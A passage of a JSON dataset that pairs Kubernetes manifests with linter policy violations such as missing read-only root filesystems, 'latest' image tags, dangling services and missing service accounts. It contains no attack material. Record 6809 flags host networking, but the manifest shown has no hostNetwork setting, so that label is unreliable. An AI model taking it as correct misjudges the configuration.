    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\n    app.kubernetes.io/name: podinfo\nspec:\n  type: ClusterIP\n  selector:\n    app: podinfo\n  ports:\n  - name: http\n    port: 9898\n    protocol: TCP\n    targetPort: http\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:podinfo])"
  },
  {
    "id": "6806",
    "manifest_path": "data/manifests/the_stack_sample/sample_2480.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: locust-master\n  labels:\n    name: locust\n    role: master\nspec:\n  ports:\n  - port: 8089\n    targetPort: loc-master-web\n    protocol: TCP\n    name: loc-master-web\n  - port: 5557\n    targetPort: loc-master-p1\n    protocol: TCP\n    name: loc-master-p1\n  - port: 5558\n    targetPort: loc-master-p2\n    protocol: TCP\n    name: loc-master-p2\n  selector:\n    name: locust\n    role: master\n  type: LoadBalancer\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[name:locust role:master])"
  },
  {
    "id": "6807",
    "manifest_path": "data/manifests/the_stack_sample/sample_2481.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: biz-service\n  namespace: springcloud-cn\n  labels:\n    app: biz-service\nspec:\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: biz-service\n    spec:\n      containers:\n      - name: biz-service\n        image: registry.cn-hangzhou.aliyuncs.com/springcloud-cn/ch22-2-6-biz-service:0.0.1-SNAPSHOT\n        imagePullPolicy: Always\n        resources:\n          requests:\n            cpu: 100m\n            memory: 256Mi\n          limits:\n            cpu: 1000m\n            memory: 2Gi\n        env:\n        - name: PROFILE\n          value: default\n        - name: SERVER_PORT\n          value: '8080'\n        - name: CONFIG_SERVER_HOST\n          value: 192.168.99.101\n        - name: CONFIG_SERVER_PORT\n          value: '8888'\n        - name: EUREKA_SERVER1_HOST\n          value: 192.168.99.101\n        - name: EUREKA_SERVER1_PORT\n          value: '8761'\n        - name: EUREKA_SERVER2_HOST\n          value: 192.168.99.101\n        - name: EUREKA_SERVER2_PORT\n          value: '8762'\n        - name: JAVA_OPTS\n          value: ' -server -XX:+PrintGCDetails -XX:+PrintTenuringDistribution -XX:+PrintGCTimeStamps\n            -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/ -Xloggc:/gc.log -XX:+UseGCLogFileRotation\n            -XX:NumberOfGCLogFiles=5 -XX:GCLogFileSize=10M'\n        ports:\n        - name: http\n          containerPort: 8080\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"biz-service\" does not have a read-only root file system"
  },
  {
    "id": "6808",
    "manifest_path": "data/manifests/the_stack_sample/sample_2481.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: biz-service\n  namespace: springcloud-cn\n  labels:\n    app: biz-service\nspec:\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: biz-service\n    spec:\n      containers:\n      - name: biz-service\n        image: registry.cn-hangzhou.aliyuncs.com/springcloud-cn/ch22-2-6-biz-service:0.0.1-SNAPSHOT\n        imagePullPolicy: Always\n        resources:\n          requests:\n            cpu: 100m\n            memory: 256Mi\n          limits:\n            cpu: 1000m\n            memory: 2Gi\n        env:\n        - name: PROFILE\n          value: default\n        - name: SERVER_PORT\n          value: '8080'\n        - name: CONFIG_SERVER_HOST\n          value: 192.168.99.101\n        - name: CONFIG_SERVER_PORT\n          value: '8888'\n        - name: EUREKA_SERVER1_HOST\n          value: 192.168.99.101\n        - name: EUREKA_SERVER1_PORT\n          value: '8761'\n        - name: EUREKA_SERVER2_HOST\n          value: 192.168.99.101\n        - name: EUREKA_SERVER2_PORT\n          value: '8762'\n        - name: JAVA_OPTS\n          value: ' -server -XX:+PrintGCDetails -XX:+PrintTenuringDistribution -XX:+PrintGCTimeStamps\n            -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/ -Xloggc:/gc.log -XX:+UseGCLogFileRotation\n            -XX:NumberOfGCLogFiles=5 -XX:GCLogFileSize=10M'\n        ports:\n        - name: http\n          containerPort: 8080\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"biz-service\" is not set to runAsNonRoot"
  },
  {
    "id": "6809",
    "manifest_path": "data/manifests/the_stack_sample/sample_2482.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-blob-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-blob-controller\n  template:\n    metadata:\n      labels:\n        app: csi-blob-controller\n    spec:\n      serviceAccountName: csi-blob-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v3.1.0\n        args:\n        - -v=2\n        - --csi-address=$(ADDRESS)\n        - --leader-election\n        - --leader-election-namespace=kube-system\n        - --timeout=120s\n        - --extra-create-metadata=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.6.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29632\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: blob\n        image: mcr.microsoft.com/k8s/csi/blob-csi:latest\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29634\n        - --user-agent-suffix=OSS-kubectl\n        ports:\n        - containerPort: 29632\n          name: healthz\n          protocol: TCP\n        - containerPort: 29634\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            memory: 200Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.4.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -handle-volume-inuse-error=false\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "6810",
    "manifest_path": "data/manifests/the_stack_sample/sample_2482.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-blob-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-blob-controller\n  template:\n    metadata:\n      labels:\n        app: csi-blob-controller\n    spec:\n      serviceAccountName: csi-blob-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v3.1.0\n        args:\n        - -v=2\n        - --csi-address=$(ADDRESS)\n        - --leader-election\n        - --leader-election-namespace=kube-system\n        - --timeout=120s\n        - --extra-create-metadata=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.6.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29632\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: blob\n        image: mcr.microsoft.com/k8s/csi/blob-csi:latest\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29634\n        - --user-agent-suffix=OSS-kubectl\n        ports:\n        - containerPort: 29632\n          name: healthz\n          protocol: TCP\n        - containerPort: 29634\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            memory: 200Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.4.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -handle-volume-inuse-error=false\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"blob\" is using an invalid container image, \"mcr.microsoft.com/k8s/csi/blob-csi:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "6811",
    "manifest_path": "data/manifests/the_stack_sample/sample_2482.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-blob-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-blob-controller\n  template:\n    metadata:\n      labels:\n        app: csi-blob-controller\n    spec:\n      serviceAccountName: csi-blob-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v3.1.0\n        args:\n        - -v=2\n        - --csi-address=$(ADDRESS)\n        - --leader-election\n        - --leader-election-namespace=kube-system\n        - --timeout=120s\n        - --extra-create-metadata=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.6.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29632\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: blob\n        image: mcr.microsoft.com/k8s/csi/blob-csi:latest\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29634\n        - --user-agent-suffix=OSS-kubectl\n        ports:\n        - containerPort: 29632\n          name: healthz\n          protocol: TCP\n        - containerPort: 29634\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            memory: 200Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.4.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -handle-volume-inuse-error=false\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "6812",
    "manifest_path": "data/manifests/the_stack_sample/sample_2482.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-blob-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-blob-controller\n  template:\n    metadata:\n      labels:\n        app: csi-blob-controller\n    spec:\n      serviceAccountName: csi-blob-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v3.1.0\n        args:\n        - -v=2\n        - --csi-address=$(ADDRESS)\n        - --leader-election\n        - --leader-election-namespace=kube-system\n        - --timeout=120s\n        - --extra-create-metadata=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.6.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29632\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: blob\n        image: mcr.microsoft.com/k8s/csi/blob-csi:latest\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29634\n        - --user-agent-suffix=OSS-kubectl\n        ports:\n        - containerPort: 29632\n          name: healthz\n          protocol: TCP\n        - containerPort: 29634\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            memory: 200Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.4.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -handle-volume-inuse-error=false\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"blob\" does not have a read-only root file system"
  },
  {
    "id": "6813",
    "manifest_path": "data/manifests/the_stack_sample/sample_2482.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-blob-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-blob-controller\n  template:\n    metadata:\n      labels:\n        app: csi-blob-controller\n    spec:\n      serviceAccountName: csi-blob-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v3.1.0\n        args:\n        - -v=2\n        - --csi-address=$(ADDRESS)\n        - --leader-election\n        - --leader-election-namespace=kube-system\n        - --timeout=120s\n        - --extra-create-metadata=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.6.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29632\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: blob\n        image: mcr.microsoft.com/k8s/csi/blob-csi:latest\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29634\n        - --user-agent-suffix=OSS-kubectl\n        ports:\n        - containerPort: 29632\n          name: healthz\n          protocol: TCP\n        - containerPort: 29634\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            memory: 200Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.4.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -handle-volume-inuse-error=false\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"csi-provisioner\" does not have a read-only root file system"
  },
  {
    "id": "6814",
    "manifest_path": "data/manifests/the_stack_sample/sample_2482.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-blob-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-blob-controller\n  template:\n    metadata:\n      labels:\n        app: csi-blob-controller\n    spec:\n      serviceAccountName: csi-blob-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v3.1.0\n        args:\n        - -v=2\n        - --csi-address=$(ADDRESS)\n        - --leader-election\n        - --leader-election-namespace=kube-system\n        - --timeout=120s\n        - --extra-create-metadata=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.6.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29632\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: blob\n        image: mcr.microsoft.com/k8s/csi/blob-csi:latest\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29634\n        - --user-agent-suffix=OSS-kubectl\n        ports:\n        - containerPort: 29632\n          name: healthz\n          protocol: TCP\n        - containerPort: 29634\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            memory: 200Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.4.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -handle-volume-inuse-error=false\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"csi-resizer\" does not have a read-only root file system"
  },
  {
    "id": "6815",
    "manifest_path": "data/manifests/the_stack_sample/sample_2482.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-blob-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-blob-controller\n  template:\n    metadata:\n      labels:\n        app: csi-blob-controller\n    spec:\n      serviceAccountName: csi-blob-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v3.1.0\n        args:\n        - -v=2\n        - --csi-address=$(ADDRESS)\n        - --leader-election\n        - --leader-election-namespace=kube-system\n        - --timeout=120s\n        - --extra-create-metadata=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.6.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29632\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: blob\n        image: mcr.microsoft.com/k8s/csi/blob-csi:latest\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29634\n        - --user-agent-suffix=OSS-kubectl\n        ports:\n        - containerPort: 29632\n          name: healthz\n          protocol: TCP\n        - containerPort: 29634\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            memory: 200Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.4.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -handle-volume-inuse-error=false\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"liveness-probe\" does not have a read-only root file system"
  },
  {
    "id": "6816",
    "manifest_path": "data/manifests/the_stack_sample/sample_2482.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: csi-blob-controller\n  namespace: kube-system\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: csi-blob-controller\n  template:\n    metadata:\n      labels:\n        app: csi-blob-controller\n    spec:\n      serviceAccountName: csi-blob-controller-sa\n      containers:\n      - name: csi-provisioner\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-provisioner:v3.1.0\n        args:\n        - -v=2\n        - --csi-address=$(ADDRESS)\n        - --leader-election\n        - --leader-election-namespace=kube-system\n        - --timeout=120s\n        - --extra-create-metadata=true\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: liveness-probe\n        image: mcr.microsoft.com/oss/kubernetes-csi/livenessprobe:v2.6.0\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=29632\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 100Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: blob\n        image: mcr.microsoft.com/k8s/csi/blob-csi:latest\n        imagePullPolicy: IfNotPresent\n        args:\n        - --v=5\n        - --endpoint=$(CSI_ENDPOINT)\n        - --metrics-address=0.0.0.0:29634\n        - --user-agent-suffix=OSS-kubectl\n        ports:\n        - containerPort: 29632\n          name: healthz\n          protocol: TCP\n        - containerPort: 29634\n          name: metrics\n          protocol: TCP\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 30\n          timeoutSeconds: 10\n          periodSeconds: 30\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          valueFrom:\n            configMapKeyRef:\n              name: azure-cred-file\n              key: path\n              optional: true\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /etc/kubernetes/\n          name: azure-cred\n        resources:\n          limits:\n            memory: 200Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      - name: csi-resizer\n        image: mcr.microsoft.com/oss/kubernetes-csi/csi-resizer:v1.4.0\n        args:\n        - -csi-address=$(ADDRESS)\n        - -v=2\n        - -leader-election\n        - --leader-election-namespace=kube-system\n        - -handle-volume-inuse-error=false\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          limits:\n            memory: 500Mi\n          requests:\n            cpu: 10m\n            memory: 20Mi\n      volumes:\n      - name: socket-dir\n        emptyDir: {}\n      - name: azure-cred\n        hostPath:\n          path: /etc/kubernetes/\n          type: DirectoryOrCreate\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"csi-blob-controller-sa\" not found"
  },
  {
    "id": "6817",
    "manifest_path": "data/manifests/the_stack_sample/sample_2482.yaml",
